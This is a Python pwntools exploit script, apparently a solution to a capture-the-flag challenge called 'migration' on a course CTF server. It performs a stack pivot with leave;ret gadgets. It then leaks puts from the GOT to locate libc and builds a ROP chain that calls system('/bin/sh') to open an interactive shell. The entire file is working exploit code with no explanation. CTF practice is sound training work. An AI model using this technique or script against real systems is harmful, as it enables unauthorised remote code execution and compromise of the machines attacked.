from pwn import *

# r = remote("127.0.0.1", 8888)
r = remote("csie.ctf.tw", 10131)
# r = process("./migration", env = {"LD_PRELOAD" : "./libc-2-27.so"})
context.arch = "amd64"

main = 0x400773
buf1 = 0x601160
buf2 = buf1 + 0x100
pop_rdi = 0x400883
leave_ret = 0x400818
puts_got = 0x600fc8
puts_plt = 0x4005e0
puts_off = 0x809c0
system_off = 0x4f440

r.recvuntil(":\n")
rop = "a" * 0x100 + flat([buf2, pop_rdi, puts_got, puts_plt, 0x4007c4])
r.sendline(rop)
r.recvuntil("?\n")
payload = "a" * 0x1f + "\x00" + p64(buf1) + p64(leave_ret)
# raw_input('aaa')
r.send(payload)

r.recvuntil("~\n")
puts = u64(r.recv(6).ljust(8, "\x00"))
libc = puts - puts_off
system = libc + system_off
rop2 = flat([pop_rdi, 0x601258, system, "/bin/sh\x00", 0x601238, leave_ret])
r.sendline(rop2)

r.interactive()
